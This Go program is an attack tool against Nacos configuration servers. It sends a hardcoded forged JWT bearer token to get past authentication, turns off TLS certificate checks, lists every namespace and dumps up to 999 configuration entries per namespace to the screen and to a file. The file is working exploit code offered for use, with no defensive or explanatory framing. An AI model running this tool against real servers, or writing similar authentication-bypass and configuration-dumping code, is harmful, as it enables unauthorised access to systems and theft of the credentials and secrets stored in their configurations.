package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

type Namespace struct {
	Namespace         string `json:"namespace"`
	NamespaceShowName string `json:"namespaceShowName"`
	NamespaceDesc     string `json:"namespaceDesc"`
	Quota             int    `json:"quota"`
	ConfigCount       int    `json:"configCount"`
	Type              int    `json:"type"`
}

type Config struct {
	ID               string `json:"id"`
	DataID           string `json:"dataId"`
	Group            string `json:"group"`
	Content          string `json:"content"`
	MD5              string `json:"md5"`
	EncryptedDataKey string `json:"encryptedDataKey"`
	Tenant           string `json:"tenant"`
	AppName          string `json:"appName"`
	Type             string `json:"type"`
}

var (
	result struct {
		Code    int         `json:"code"`
		Message interface{} `json:"message"`
		Data    []Namespace `json:"data"`
	}
	configs struct {
		TotalCount     int      `json:"totalCount"`
		PageNumber     int      `json:"pageNumber"`
		PagesAvailable int      `json:"pagesAvailable"`
		PageItems      []Config `json:"pageItems"`
	}
	configResult struct {
		TotalCount     int `json:"totalCount"`
		PageNumber     int `json:"pageNumber"`
		PagesAvailable int `json:"pagesAvailable"`
		PageItems      []struct {
			ID               string `json:"id"`
			DataID           string `json:"dataId"`
			Group            string `json:"group"`
			Content          string `json:"content"`
			MD5              string `json:"md5"`
			EncryptedDataKey string `json:"encryptedDataKey"`
			Tenant           string `json:"tenant"`
			AppName          string `json:"appName"`
			Type             string `json:"type"`
		} `json:"pageItems"`
	}
)

func main() {
	urlPtr := flag.String("u", "", "URL to request https://example.com/nacos/")
	tokenPtr := flag.String("token", "", "accessToken for request")
	jwtPtr := flag.Bool("jwt", false, "jwt bypass nacos Authentication")
	flag.Parse()
	if *urlPtr == "" {
		fmt.Println(os.Args[0] + " -u https://example.com/nacos/")
		os.Exit(0)
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req1, err := http.NewRequest("GET", *urlPtr+"v1/console/namespaces", nil)
	if err != nil {
		fmt.Println(err)
		panic(err)
	}
	if *tokenPtr != "" {
		req1.Header.Set("accessToken", *tokenPtr)
	}
	if *jwtPtr {
		req1.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA")
	}

	resp1, err := client.Do(req1)
	if err != nil {
		fmt.Println(err)
		panic(err)
	}
	defer resp1.Body.Close()

	body1, err := ioutil.ReadAll(resp1.Body)
	if err != nil {
		fmt.Println(err)
		panic(err)
	}

	if err := json.Unmarshal(body1, &result); err != nil {
		fmt.Println(err)
		panic(err)
	}

	file, err := os.OpenFile("output.txt", os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err)
		panic(err)
	}
	defer file.Close()
	for _, item := range result.Data {
		tenant := item.Namespace
		fmt.Fprintln(file, "###################", tenant, "###################")
		fmt.Println("###################", tenant, "###################")
		url := fmt.Sprintf("%sv1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=999&tenant=%s&search=accurate", *urlPtr, tenant)

		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println(err)
			panic(err)
		}

		if *tokenPtr != "" {
			req.Header.Set("accessToken", *tokenPtr)
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
			panic(err)
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err)
			panic(err)
		}

		if err := json.Unmarshal(body, &configResult); err != nil {
			fmt.Println(err)
			panic(err)
		}
		fmt.Fprintln(file, "==========================================================")
		fmt.Println("==========================================================")
		for _, item := range configResult.PageItems {
			content := item.Content
			content = strings.Replace(content, "\r\n", "\n", -1)
			fmt.Fprintln(file, "DataID:"+item.DataID)
			fmt.Println("DataID:" + item.DataID)
			fmt.Fprintln(file, "Group:"+item.Group)
			fmt.Println("Group:" + item.Group)
			fmt.Fprintln(file, content)
			fmt.Println(content)
			fmt.Fprintln(file, "==========================================================")
			fmt.Println("==========================================================")
		}
	}
	fmt.Println("output ok")
}
